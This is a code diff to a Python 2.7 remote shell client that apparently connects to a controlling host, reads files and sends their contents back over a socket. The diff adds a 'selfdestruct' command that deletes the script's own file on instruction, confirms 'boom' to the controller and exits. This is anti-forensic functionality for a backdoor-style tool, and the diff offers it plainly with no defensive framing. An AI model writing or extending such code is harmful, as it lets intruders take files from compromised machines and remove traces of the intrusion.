@@ -1,5 +1,6 @@
 #!/usr/bin/python2.7
 
+import os
 import re
 import sys
 import time
@@ -62,6 +63,16 @@ def shell_client(host, port):
                         socksend(s, f.read())
                 except IOError as e:
                     socksend(s, e.strerror)
+            elif inp == 'selfdestruct':
+                try:
+                    os.remove(__file__)
+                    if __file__.strip('./') not in os.listdir('.'):
+                        socksend(s, 'boom')
+                        sys.exit()
+                    else:
+                        raise Exception('client not deleted')
+                except Exception as e:
+                    socksend(s, str(e.message))
             else:
                 socksend(s, 'Unrecognized')
         except socket.error as e:
